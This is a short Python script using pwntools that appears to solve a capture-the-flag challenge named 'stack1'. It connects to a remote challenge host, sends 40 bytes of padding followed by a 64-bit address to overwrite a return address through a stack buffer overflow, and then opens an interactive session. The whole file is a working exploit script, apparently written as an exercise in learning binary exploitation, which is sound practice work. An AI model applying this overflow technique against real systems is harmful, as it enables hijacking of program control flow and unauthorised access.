from pwn import *

# p = process("./stack1")
p = remote("rev.danissimurr.ru", 1340)
p.sendline(b'A'*40 + p64(0x401196))
p.interactive()